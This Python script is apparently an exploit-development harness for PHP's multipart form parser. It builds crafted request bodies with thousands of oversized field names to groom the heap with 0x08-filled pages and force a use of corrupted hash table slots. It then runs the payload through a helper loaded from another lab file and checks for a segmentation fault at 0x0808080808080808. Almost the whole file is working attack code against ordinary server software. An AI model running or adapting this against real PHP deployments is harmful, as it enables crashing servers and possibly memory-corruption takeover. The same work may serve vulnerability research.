#!/usr/bin/env python3
"""oom39: poison-slot kill — oom38 geometry (name 3064: binned tmps, 1-page
key) + PREP PHASE: 300 flat parts with value = 0x08*POISON freed on register
-> carver free pool full of 0x08 pages -> table resize's fresh tail (slots
2048..4095) = poisoned -> key-death slot garbage = 0x0808... -> shutdown dtor
derefs -> SIGSEGV at 0x0808080808080808 -> RC 139.
usage: oom39.py [limit] [prep] [poison]
"""
import re
import sys

exec(open("/tmp/phplab/oom33.py").read().replace('if __name__ == "__main__":', 'if False:'))

NAMELEN = 3064  # tmps 3072-bin, key 3090 (1 page)


def build39(prep=300, poison=60000):
    ps = []
    for n in range(prep):
        # 200KB NAME = large-alloc transient (49 pages -> carver -> poisoned);
        # value tiny. Name-tmps are freed, so nothing persistent grows.
        nm = b"q" + b"K" * (poison - 10) + (b"%06d" % n)
        ps.append(b'--BOUND\r\nContent-Disposition: form-data; name="' + nm +
                  b'"\r\n\r\nv\r\n')
    for i in range(4200):
        head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
                (b"%d" % i) + b'[x]"\r\n\r\n')
        ps.append(head + b"v\r\n")
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def decode_lim(limit, prep, poison):
    rc, tr = run(build39(prep, poison), limit)
    commits = [(m.start(), m.group(2), m.group(3))
               for m in re.finditer(r"TRACE keycommit stage=(\d+) elem=(\d+) free=(\d+)", tr)]
    ok_positions = [m.start() for m in re.finditer(r"TRACE keyok", tr)]
    last = commits[-1] if commits else None
    key_death = last is not None and not any(p > last[0] for p in ok_positions)
    tried = re.findall(r"tried to allocate (\d+) bytes", tr)
    rcnum = rc.replace("RC=", "")
    if key_death or rcnum == "139":
        i = tr.rfind("TRACE keycommit")
        print("lim=%d rc=%s %s elem=%s free=%s tried=%s" %
              (limit, rcnum, "*** KEY DEATH ***" if key_death else "post-cycle",
               last[1] if last else "-", last[2] if last else "-",
               tried[-1] if tried else "-"), flush=True)
        if rcnum == "139":
            print("*** SEGV — CORRUPTION MATERIALIZED (RC 139) ***")
            d = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", "dmesg 2>/dev/null | tail -4"],
                               capture_output=True)
            if d.returncode == 0 and d.stdout.strip():
                print(d.stdout.decode(errors="replace"))
        else:
            ctx = [l for l in tr[max(0, i - 500):i + 200].splitlines()
                   if ("TRACE" in l or "tried" in l or "Allowed" in l)][-10:]
            print("\n".join(ctx))
        print("---")
        return True
    tag = "fatal:" + (tried[-1] if tried else "?") if "Allowed memory" in tr else "survive"
    print("lim=%d rc=%s %s commits=%d oks=%d" %
          (limit, rcnum, tag, len(commits), len(ok_positions)), flush=True)
    return False


if __name__ == "__main__":
    lim = int(sys.argv[1]) if len(sys.argv) > 1 else 21_000_000
    prep = int(sys.argv[2]) if len(sys.argv) > 2 else 300
    poison = int(sys.argv[3]) if len(sys.argv) > 3 else 60000
    decode_lim(lim, prep, poison)
